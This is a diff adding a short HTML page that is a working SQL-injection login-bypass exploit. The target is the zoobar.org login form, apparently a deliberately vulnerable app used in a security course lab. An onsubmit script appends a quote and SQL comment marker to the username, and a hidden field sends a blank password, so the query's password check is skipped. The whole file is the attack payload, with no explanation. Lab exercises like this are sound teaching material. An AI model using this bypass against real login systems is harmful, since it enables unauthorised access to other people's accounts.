@@ -1,0 +1,10 @@
+<form id="myForm" name="initial_input" method="post" action="http://zoobar.org/index.php" onsubmit="clickLogin()">
+    <input id="username" name="login_username" />
+    <input hidden id="password" name="login_password" value=" " />
+    <button id="submit_button" type="submit" name="submit_login" >Submit</button>
+</form>
+<script>
+    function clickLogin() {
+        document.getElementById("username").value = document.getElementById("username").value + "'--";
+    }
+</script>
